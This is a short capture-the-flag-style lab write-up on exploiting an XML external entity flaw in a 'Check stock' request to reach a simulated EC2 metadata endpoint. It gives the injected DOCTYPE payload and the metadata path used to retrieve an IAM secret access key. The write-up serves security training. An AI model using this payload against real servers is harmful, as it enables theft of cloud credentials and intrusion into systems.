# Lab: Exploiting XXE to perform SSRF attacks

>This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

>The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

>To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

### Observations
`POST /product/stock` contains the following xml in the body of the request:

 `<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>`

 I declared the following external entity to make a request to 169.254.169.254: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>` and then replaced the productId value with `&xxe;`

 I sent this request and the server returned status code 400 with: "Invalid product ID: latest"

 We did not pass anything that would include the value `latest`. Is it possible that this message was returned from the `169.254.169.254` IP? So I then made a request to `http://169.254.169.254/latest`

 We then receive the following response:
  "Invalid product ID: meta-data"

and then:
 "Invalid product ID: iam"

 and then:
 "Invalid product ID: security-credentials"

 and then:
  "Invalid product ID: admin"

### Solution
I just kept appending the "invalid product id" to my request and it led me to create this request:

`http://169.254.169.254/latest/meta-data/iam/security-credentials/admin`

This endpoint shows a SecretAccessKey, lab solved!


